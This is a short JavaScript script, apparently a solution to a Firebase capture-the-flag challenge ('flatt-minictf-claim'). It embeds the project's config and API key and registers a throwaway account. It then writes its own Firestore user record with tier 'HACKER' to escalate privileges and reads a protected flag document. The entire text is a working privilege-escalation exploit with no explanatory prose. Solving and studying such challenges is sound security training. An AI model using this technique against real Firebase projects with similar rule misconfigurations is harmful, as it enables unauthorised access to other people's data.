(async () => {
  const load = (url) =>
    new Promise((resolve) => {
      const script = document.createElement("script");
      script.setAttribute("src", url);
      script.onload = resolve;
      document.body.appendChild(script);
    });
  await load("https://www.gstatic.com/firebasejs/10.7.0/firebase-app-compat.js");
  await load("https://www.gstatic.com/firebasejs/10.7.0/firebase-auth-compat.js");
  await load("https://www.gstatic.com/firebasejs/10.7.0/firebase-functions-compat.js");
  await load("https://www.gstatic.com/firebasejs/10.7.0/firebase-firestore-compat.js");

  firebase.initializeApp({
    apiKey: "AIzaSyCrzQakEDKgeNRJf7BfKr7_m1hNHzN8Nns",
    authDomain: "flatt-minictf-claim.firebaseapp.com",
    projectId: "flatt-minictf-claim",
    storageBucket: "flatt-minictf-claim.appspot.com",
    messagingSenderId: "316654225014",
    appId: "1:316654225014:web:0a1a4bd460f1117bf30157"
  });

  await firebase.auth().createUserWithEmailAndPassword('exploit@flatt.tech', 'flattsecurity');
  await firebase.auth().signInWithEmailAndPassword('exploit@flatt.tech', 'flattsecurity');
  const myUserId = firebase.auth().currentUser.uid;

  await new Promise(resolve => setTimeout(resolve, 3000));

  await firebase.firestore().collection('users').doc(myUserId).set({
    clicks: 1,
    tier: 'HACKER',
  })
  
  await new Promise(resolve => setTimeout(resolve, 3000));

  await firebase.auth().currentUser.getIdToken(true);
  const doc = await firebase.firestore().collection('flags').doc('flag').get();
  console.log(doc.data());
})();
